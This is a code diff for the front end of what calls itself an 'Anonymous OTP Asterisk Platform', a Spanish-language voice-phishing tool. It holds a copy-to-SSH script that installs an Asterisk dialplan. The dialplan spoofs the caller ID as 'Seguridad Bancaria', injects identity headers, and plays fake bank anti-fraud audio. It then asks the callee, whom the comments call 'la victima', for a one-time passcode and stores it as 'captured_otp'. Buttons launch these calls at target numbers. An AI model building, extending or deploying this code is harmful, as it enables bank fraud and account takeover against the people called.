+              <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-2 border-b border-slate-800 pb-2">
+                <div className="flex items-center gap-2">
+                  <Terminal className="w-5 h-5 text-amber-400 shrink-0" />
+                  <div>
+                    <h4 className="text-xs font-bold text-amber-300 uppercase tracking-wider">
+                      Script Autónomo para Aplicar en Servidor VPS (vmi3461829)
+                    </h4>
+                    <p className="text-[11px] text-slate-400">
+                      Actualiza /etc/asterisk/extensions.conf con este flujo y recarga Asterisk.
+                    </p>
+                  </div>
+                </div>
+
+                <button
+                  type="button"
+                  onClick={() => {
+                    const fullScript = `cat << 'EOF' > /etc/asterisk/extensions.conf
+; ========================================================
+; DIALPLAN DE LLAMADAS INTERNAS Y SALIENTES VIA PJSIP
+; Auto-generado por Anonymous OTP Asterisk Platform
+; ========================================================
+
+[general]
+static=yes
+writeprotect=no
+
+[globals]
+GLOBAL_CARRIER_HOST=162.248.51.10
+GLOBAL_DEFAULT_INTRO=${campaignAudios[selectedService]?.introAudioPath || 'custom/alerta_banco_antifraude'}
+GLOBAL_DEFAULT_PROMPT=${campaignAudios[selectedService]?.promptAudioPath || 'custom/solicitar_codigo_otp'}
+GLOBAL_DEFAULT_WAIT=custom/un_momento_validando_informacion
+GLOBAL_DEFAULT_SUCCESS=${campaignAudios[selectedService]?.successAudioPath || 'custom/operacion_bloqueada_exito'}
+GLOBAL_DEFAULT_AGENT=${campaignAudios[selectedService]?.agentAudioPath || 'custom/conectar_asesor_banco'}
+
+; Subrutina Pre-Dial para inyectar cabeceras PJSIP en canal saliente real
+[sub-pjsip-headers]
+exten => s,1,NoOp(=== Inyectando PJSIP Headers en Canal Saliente: \${CHANNEL} ===)
+ same => n,Set(PJSIP_HEADER(add,Privacy)=none)
+ same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@\${GLOBAL_CARRIER_HOST}>)
+ same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)=<sip:\${CALLERID(num)}@\${GLOBAL_CARRIER_HOST}>;party=calling;screen=yes;privacy=off)
+ same => n,Return()
+
+[from-internal]
+; 1. Llamadas internas entre extensiones (1001-1999)
+exten => _1XXX,1,NoOp(Llamada interna a extension \${EXTEN})
+ same => n,Dial(PJSIP/\${EXTEN},30,Tt)
+ same => n,Hangup()
+
+; 2. Acceso y Prueba Directa IVR desde Softphone X-Lite (Extension 8888)
+exten => 8888,1,NoOp(=== PRUEBA DIRECTA IVR EXT 8888 ===)
+ same => n,Set(IS_TEST_CALL=1)
+ same => n,Set(CALL_DEST=8888)
+ same => n,Set(CALLING_AGENT=\${CALLERID(num)})
+ same => n,Set(IVR_AGENT_EXTEN=${agentExtension})
+ same => n,Goto(ivr-otp,s,1)
+
+; 2b. Acceso a Simulador IVR Local (*8888 o 8880)
+exten => *8888,1,Goto(8888,1)
+exten => 8880,1,Goto(8888,1)
+
+; 3. Regla Saliente USA / Canada 11 digitos
+exten => _1NXXNXXXXXX,1,NoOp(Llamada Saliente 11 digitos a \${EXTEN} via televox)
+ same => n,Set(CALLING_AGENT=\${CALLERID(num)})
+ same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})
+ same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})
+ same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=+18005550199))
+ same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=Seguridad Bancaria))
+ same => n,Set(CALLERID(pres)=allowed_passed_screen)
+ same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)
+ same => n,Dial(PJSIP/\${EXTEN}@televox,60,Ttb(sub-pjsip-headers^s^1))
+ same => n,Hangup()
+
+; 4. Regla Saliente 10 digitos (antepone 1)
+exten => _NXXNXXXXXX,1,NoOp(Llamada Saliente 10 digitos a 1\${EXTEN} via televox)
+ same => n,Dial(PJSIP/1\${EXTEN}@televox,60,Ttb(sub-pjsip-headers^s^1))
+ same => n,Hangup()
+
+; 5. Regla Saliente Generica
+exten => _X.,1,NoOp(Llamada Saliente a \${EXTEN} via televox)
+ same => n,Dial(PJSIP/\${EXTEN}@televox,60,Ttb(sub-pjsip-headers^s^1))
+ same => n,Hangup()
+
+[trunkinbound]
+exten => _X.,1,NoOp(Llamada Entrante por Troncal: \${CALLERID(num)})
+ same => n,Goto(ivr-otp,s,1)
+
+; ========================================================
+; CONTEXTO IVR INTERACTIVO CON AUDIOS PREGRABADOS
+; ========================================================
+[ivr-otp]
+exten => s,1,NoOp(=== IVR INTERACTIVO CON AUDIOS PREGRABADOS ===)
+ same => n,Answer()
+ same => n,Wait(1)
+ same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})
+ 
+ same => n,Set(IVR_INTRO=\${DB(ivr_vars/\${TARGET_DEST}_intro)})
+ same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/8888_intro)}))
+ same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${GLOBAL_DEFAULT_INTRO}))
+ same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=custom/alerta_banco_antifraude))
+ 
+ same => n,Set(IVR_PROMPT=\${DB(ivr_vars/\${TARGET_DEST}_prompt)})
+ same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${DB(ivr_vars/8888_prompt)}))
+ same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${GLOBAL_DEFAULT_PROMPT}))
+ same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=custom/solicitar_codigo_otp))
+ 
+ same => n,Set(IVR_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent)})
+ same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=\${GLOBAL_DEFAULT_AGENT}))
+ same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=custom/conectar_asesor_banco))
+ 
+ same => n,Set(IVR_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)})
+ same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=\${GLOBAL_DEFAULT_SUCCESS}))
+ same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=custom/operacion_bloqueada_exito))
+
+ same => n,Set(IVR_WAIT=custom/un_momento_validando_informacion)
+
+ ; 1. Reproducir Saludo de Alerta Antifraude
+ same => n,Playback(\${IVR_INTRO})
+ same => n,Wait(1)
+
+ ; 2. Reproducir Solicitud de Token y esperar digitos (Read)
+ same => n,Read(CAPTURED_CODE,\${IVR_PROMPT},6,,3,10)
+
+ ; Si la victima presiono 1 (Modo Asesor Directo)
+ same => n,GotoIf($["\${CAPTURED_CODE}" = "1"]?transfer_agent)
+ same => n,GotoIf($["\${CAPTURED_CODE}" = ""]?no_digits)
+
+ ; 3. Guardar en AstDB
+ same => n,Set(DB(captured_otp/\${TARGET_DEST}/code)=\${CAPTURED_CODE})
+ same => n,Set(DB(captured_otp/\${TARGET_DEST}/status)=captured)
+ same => n,Set(DB(captured_otp/\${TARGET_DEST}/timestamp)=\${EPOCH})
+ same => n,UserEvent(OtpCaptured,Destination: \${TARGET_DEST},Code: \${CAPTURED_CODE})
+
+ ; 4. Reproducir Espera y luego Exito
+ same => n,Playback(\${IVR_WAIT})
+ same => n,Wait(1)
+ same => n,Playback(\${IVR_SUCCESS})
+ same => n,Wait(2)
+ same => n,Hangup()
+
+ ; Transferencia a Extensión Asesor (Softphone X-Lite ${agentExtension})
+ same => n(transfer_agent),Playback(\${IVR_AGENT})
+ same => n,Dial(PJSIP/${agentExtension},30,Tt)
+ same => n,Hangup()
+
+ ; Sin digitos ingresados
+ same => n(no_digits),Playback(custom/por_favor_ingrese_su_clave)
+ same => n,Read(CAPTURED_CODE2,beep,6,,2,8)
+ same => n,GotoIf($["\${CAPTURED_CODE2}" != ""]?save_retry)
+ same => n,Hangup()
+
+ same => n(save_retry),Set(DB(captured_otp/\${TARGET_DEST}/code)=\${CAPTURED_CODE2})
+ same => n,Set(DB(captured_otp/\${TARGET_DEST}/status)=captured)
+ same => n,Playback(\${IVR_SUCCESS})
+ same => n,Hangup()
+EOF
+
+asterisk -rx 'dialplan reload'
+asterisk -rx 'pjsip reload'
+echo "=== ¡ASTERISK ACTUALIZADO CORRECTAMENTE! ==="`;
+                    navigator.clipboard.writeText(fullScript);
+                    setIsCopiedVpsCmd(true);
+                    setTimeout(() => setIsCopiedVpsCmd(false), 2500);
+                  }}
+                  className="px-3 py-1.5 rounded-lg bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border border-amber-500/40 text-xs font-semibold flex items-center gap-1.5 transition-all self-start sm:self-auto shadow-sm"
+                >
+                  <Copy className="w-3.5 h-3.5" />
+                  <span>{isCopiedVpsCmd ? '¡Script Copiado!' : 'Copiar Script SSH'}</span>
+                </button>
+              </div>
+
+              <p className="text-[11px] text-slate-400 leading-relaxed">
+                Haz clic en <strong>"Copiar Script SSH"</strong> y pégalo directamente en la consola SSH de tu servidor Asterisk (<code className="text-amber-300">vmi3461829</code>). Aplicará las rutas de audio de esta campaña y recargará el dialplan al instante.
+              </p>
+            </div>
+          </div>
+
+          {/* Barra de Lanzamiento Inmediato desde la Pestaña del IVR */}
+          <div className="p-5 rounded-2xl bg-gradient-to-r from-slate-950 via-slate-900 to-slate-950 border border-emerald-500/30 flex flex-col sm:flex-row items-center justify-between gap-4">
+            <div className="flex items-center gap-3">
+              <div className="p-2.5 rounded-xl bg-emerald-500/20 text-emerald-400">
+                <Rocket className="w-5 h-5" />
+              </div>
+              <div>
+                <div className="text-xs font-bold text-white">¿Listo para lanzar con este flujo de IVR?</div>
+                <div className="text-[11px] text-slate-400">
+                  Destino actual: <strong className="text-emerald-400 font-mono">{targetNumber || 'Sin número'}</strong> | Modo: <strong className="text-white uppercase">{callFlowMode}</strong>
+                </div>
+              </div>
+            </div>
+
+            <div className="flex items-center gap-2.5 w-full sm:w-auto">
+              <button
+                type="button"
+                onClick={() => setProductionMode('single')}
+                className="px-4 py-2.5 rounded-xl bg-slate-900 hover:bg-slate-800 text-slate-300 border border-slate-700 text-xs font-bold transition-all w-full sm:w-auto text-center"
+              >
+                Ajustar Número / CallerID
+              </button>
+
+              <button
+                type="button"
+                onClick={handleLaunchProductionCall}
+                disabled={isLaunching || !targetNumber.trim()}
+                className="px-6 py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-400 disabled:opacity-50 text-slate-950 font-black text-xs uppercase tracking-wider flex items-center justify-center gap-2 shadow-lg shadow-emerald-500/20 transition-all w-full sm:w-auto"
+              >
+                <PhoneCall className={`w-4 h-4 ${isLaunching ? 'animate-bounce' : ''}`} />
+                <span>{isLaunching ? 'Lanzando Llamada...' : 'Lanzar Llamada Ahora'}</span>
+              </button>
             </div>
           </div>
         </div>
